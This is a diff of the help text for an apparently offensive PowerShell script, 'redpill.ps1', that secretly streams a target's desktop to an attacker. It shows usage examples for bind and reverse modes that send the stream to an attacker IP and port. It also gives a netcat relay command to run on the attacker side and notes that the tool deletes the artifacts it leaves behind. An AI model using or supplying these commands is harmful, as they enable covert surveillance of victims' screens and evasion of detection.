@@ -4858,41 +4858,41 @@ $HelpParameters = @"
    .NOTES
       Mandatory dependencies: A browser which supports MJPEG (Default: Firefox)
       If attacker sellect a -Timmer '0' then stream will stay open until attacker
-      manually stops it using this cmdlet -LiveStream 'Stop' argument, If another
+      manualy stops it using this cmdlet -LiveStream 'Stop' argument, If another
       Timmer its sellected then this cmdlet will wait -Timmer 'seconds' to stop
       the streaming and delete ALL artifacts left behind by this function.
 
-   .PARAMETER LiveStream
+   .Parameter LiveStream
       Accepts arguments: Bind, Reverse, Stop (default: Bind)
 
    .Parameter IPAddress
-      The IP address to connect to when using the -Reverse switch.
+      The attacker IP address to connect to when using -Reverse switch.
 
-   .PARAMETER Port
+   .Parameter Port
       The port number to connect to when using the -Reverse switch.
       When using -Bind it is the port on which this script listens.
 
-   .PARAMETER Timmer
+   .Parameter Timmer
       The amount of time in seconds to keep streaming (default: 18)
 
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -LiveStream Bind -Port 4321 -Timmer 25
       Start target desktop live streamimg on port 4321 tcp for 25 seconds time!
+      Access stream on attacker: http://<target_ip>:4321 OR http://127.0.0.1:4321
 
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -LiveStream Bind -Port 1234 -Timmer 0
       Start target desktop live streamimg on port 1234 (keep streaming indefinitely)
-      Remark: If a -Timmer '0' its sellected, then streaming must be manual stoped!
+      Remark: If -Timmer '0' its sellected, then streaming must be manualy stoped!
 
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -LiveStream Reverse -IpAddress 192.168.1.73 -Port 4444
       Remark: Then execute this netcat cmdline on attacker side: [ nc -nlvp 4444 | nc -nlvp 9000 ]
+      Access stream on attacker firefox browser: http://192.168.1.73:9000
 
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -LiveStream Stop
-      Stop target live streammimg if sellected -Timmer '0' in Bind|Reverse!
-      Remark: Streamimg will stop after -Timmer '<string>' its reached except
-      for -Timmer '0' that keeps streaming until -LiveStream 'Stop' its executed!
+      Remote stop target desktop live streamimg process
 
    .OUTPUTS
       Stream desktop settings
